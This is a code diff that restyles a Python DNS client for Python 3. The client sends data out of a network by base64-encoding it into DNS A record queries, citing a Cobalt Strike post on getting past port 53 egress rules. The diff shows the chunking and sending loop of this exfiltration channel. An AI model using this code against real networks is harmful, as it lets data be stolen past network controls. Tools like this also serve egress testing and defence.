@@ -1,15 +1,18 @@
-'''
+"""
 
 This is a DNS client that transmits data within A record requests
 Thanks to Raffi for his awesome blog posts on how this can be done
 http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/
 
-'''
+"""
 
 import base64
 import dns.resolver
 import socket
 import sys
+
+from scapy.layers.dns import DNS, DNSQR
+from scapy.layers.inet import IP, UDP
 from common import helpers
 from scapy.all import *
 
@@ -29,17 +32,17 @@ class Client:
         resolver_object = dns.resolver.get_default_resolver()
         nameserver = resolver_object.nameservers[0]
 
-        while (byte_reader < len(data_to_transmit) + self.length):
+        while byte_reader < len(data_to_transmit) + self.length:
             encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
             encoded_data = encoded_data.replace("=", ".---")
 
             # calcalate total packets
-            if ((len(data_to_transmit) % self.length) == 0):
+            if (len(data_to_transmit) % self.length) == 0:
                 total_packets = len(data_to_transmit) / self.length
             else:
                 total_packets = (len(data_to_transmit) / self.length) + 1
 
-            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
+            print('[*] Packet Number/Total Packets:        ' + str(packet_number) + "/" + str(total_packets))
 
             # Craft the packet with scapy
             try:
@@ -49,7 +52,7 @@ class Client:
             except socket.gaierror:
                 pass
             except KeyboardInterrupt:
-                print "[*] Shutting down..."
+                print('[*] Shutting down...')
                 sys.exit()
 
             # Increment counters
